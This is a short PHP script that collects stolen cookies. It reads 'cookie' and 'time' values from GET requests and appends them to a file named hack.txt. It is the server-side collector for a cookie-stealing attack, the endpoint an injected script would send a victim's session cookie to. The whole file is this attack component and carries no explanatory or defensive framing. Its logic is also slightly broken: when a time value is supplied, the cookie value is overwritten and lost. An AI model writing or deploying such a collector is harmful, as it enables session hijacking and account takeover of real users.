<?php

$file = fopen('hack.txt',"a");
// fwrite($file, "sdads\n");
// fclose($file);


if(isset($_GET['cookie'])) {
  $txt = $_GET['cookie'];
  $txt=$txt."\n";
  $txt= isset($_GET['time']) ? $txt.$_GET['time']."\n" : "\n";
  $txt = $txt."-----------------------------------------\n";
  fwrite($file, $txt);
  fclose($file);
}

 ?>


